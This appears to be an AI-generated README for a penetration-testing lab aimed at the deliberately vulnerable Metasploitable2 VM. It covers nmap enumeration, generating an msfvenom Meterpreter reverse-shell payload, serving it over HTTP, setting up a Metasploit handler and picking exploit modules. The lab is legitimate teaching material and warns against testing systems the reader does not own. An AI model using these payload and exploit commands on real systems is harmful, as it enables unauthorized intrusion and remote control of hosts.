Certainly! Below is the `README.md` based on the provided lab instructions:

# Lab: Initial Access and Exploitation

## Overview
This lab simulates the initial access phase of a penetration test, where adversaries exploit exposed services to gain a foothold in a target network. The lab involves performing reconnaissance, service enumeration, exploiting known vulnerabilities, and establishing a Meterpreter session on a deliberately vulnerable host (Metasploitable2) from a Kali Linux attacker VM.

**Estimated Time**: 30 minutes

**Lab Safety**: This lab should only be performed in a controlled, isolated environment. Do not scan or attack systems you do not own or have explicit permission to test.

## Learning Objectives
After completing this lab, you will be able to:
- Perform host discovery and multi-stage service enumeration (quick → targeted → script-assisted).
- Validate suspected vulnerabilities using Nmap NSE scripts and banner checks.
- Capture evidence traffic using tools like tcpdump/Wireshark.
- Generate and handle reverse shell payloads in Metasploit.
- Exploit a known vulnerable service to gain initial access.
- Baseline a compromised host and collect evidence for reporting.

## Prerequisites
- Kali Linux attacker VM.
- Metasploitable2 VM (deliberately vulnerable).
- Basic knowledge of Nmap, Metasploit, tcpdump, and general penetration testing techniques.

---

## Lab Setup

### Terminal Setup
You will use five terminal windows for the following tasks:
- **Terminal A**: Kali Terminal (Main) – Host discovery, enumeration, payload generation, quick checks.
- **Terminal B**: Packet Capture (tcpdump) – Capture exploit traffic.
- **Terminal C**: Metasploit Handler – Handle reverse shell connections.
- **Terminal D**: Exploit / Module msfconsole – Search and run exploits.
- **Terminal E**: Target Container Shell (Optional) – Target-side verification.

### Step 1: Environment Pre-checks and Start the Vulnerable Container
1. **Confirm network interfaces and IPs** on both Kali and Metasploitable2 VMs using `ip a`.
2. **Ensure Metasploitable2 is running** and get its IP:
   ```bash
   sudo docker ps --filter "name=metasploitable2"
   sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' metasploitable2


3. **Verify connectivity** both ways:

   * From Kali to Metasploitable2:

     ```bash
     ping -c 2 <MSF2_IP>
     ```
   * From Metasploitable2 to Kali:

     ```bash
     ping -c 2 <KALI_IP>
     ```

### Step 2: Discover and Confirm Live Hosts

1. Run a **fast host discovery** scan:

   ```bash
   sudo nmap -sn <Your_subnet>
   ```
2. **Corroborate findings with ARP/NetBIOS sweep** using `netdiscover`:

   ```bash
   sudo netdiscover -r <Your_subnet>
   ```

### Step 3: Layered Service Enumeration

1. **Fast top-ports scan**:

   ```bash
   nmap --top-ports 2000 -sS -T3 <MSF2_IP> -oN topports.txt
   ```
2. **Deeper scan with service/version detection**:

   ```bash
   nmap -sS -sV -O -sC <MSF2_IP> -oN enum_deep.txt
   ```
3. **Full port scan (if needed)**:

   ```bash
   sudo nmap -sS -sV -p- <MSF2_IP> -oN all_tcp_ports.txt
   ```

### Step 4: Capture Traffic Evidence

1. **Capture traffic using tcpdump**:

   ```bash
   sudo tcpdump -i any host <MSF2_IP> -w exploit.pcap
   ```

### Step 5: Create and Stage a Reverse Shell Payload

1. **Generate the payload** using `msfvenom`:

   ```bash
   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f elf -o shell.elf
   ```
2. **Host the payload** via HTTP:

   ```bash
   python3 -m http.server 8000
   ```
3. Verify accessibility using:

   ```bash
   curl -I http://<KALI_IP>:8000/
   ```

### Step 6: Re-run Enumeration and Targeted NSE Scripts

Run service-specific Nmap NSE scripts to gather additional evidence for vulnerability confirmation:

```bash
# SMB
sudo nmap -sV -p 139,445 --script smb-os-discovery,smb-enum-shares <MSF2_IP> -oN nse_smb.txt
# FTP (check both port 21 and 2121)
sudo nmap --script ftp-vsftpd-backdoor -p 21,2121 <MSF2_IP> -oN nse_ftp_vsftpd.txt
# Distccd
sudo nmap -sV -p 3632 --script distcc-exec <MSF2_IP> -oN nse_distcc.txt
# MySQL
sudo nmap -sV -p 3306 --script mysql-empty-password,mysql-version <MSF2_IP> -oN nse_mysql.txt
# PostgreSQL
sudo nmap -sV -p 5432 --script pgsql-info,pgsql-brute <MSF2_IP> -oN nse_pgsql.txt
# SMTP
sudo nmap -sV -p 25 --script smtp-commands,smtp-open-relay <MSF2_IP> -oN nse_smtp.txt
```

### Step 7: Prepare Metasploit Handler

1. **Start msfconsole** and configure the handler to listen for incoming sessions:

   ```bash
   msfconsole -q
   use exploit/multi/handler
   set PAYLOAD linux/x86/meterpreter/reverse_tcp
   set LHOST <KALI_IP>
   set LPORT 4444
   set ExitOnSession false
   run -j
   ```

### Step 8: Exploit Target and Verify Access

1. **Exploit the target using Metasploit**. Here are a few paths based on enumeration results:

   * **Samba (Ports 139/445)**: `exploit/multi/samba/usermap_script`
   * **ProFTPD (Port 2121)**: `exploit/unix/ftp/proftpd_1337backdoor`
   * **distccd (Port 3632)**: `exploit/multi/distcc_exec`
   * **MySQL (Port 3306)**: Use MySQL empty password exploits.
   * **PostgreSQL (Port 5432)**: Use PostgreSQL brute force exploits.

2. **Verify access**:

   * Check for sessions:

     ```bash
     sessions -l
     ```
   * Interact with the session:

     ```bash
     sessions -i <ID>
     ```

3. **Capture evidence** using `tcpdump` and save the pcap file for your report.

---

## Troubleshooting

* **Handler LPORT/LHOST mismatch**: Ensure that Metasploit's handler matches the payload configuration.
* **Wrong RPORT**: Ensure that the RPORT matches the open ports identified in Nmap.
* **Container Networking**: Confirm the container’s IP and verify it can reach your Kali LHOST.
* **Payload Architecture**: Verify the target's architecture using `uname -m`.

## Final Notes

* Always save your Nmap output, NSE script results, and the final `exploit.pcap` for reporting.
* Do not run these tests outside of a controlled lab environment.
* Document every command you run and include timestamps for each action in your final report.
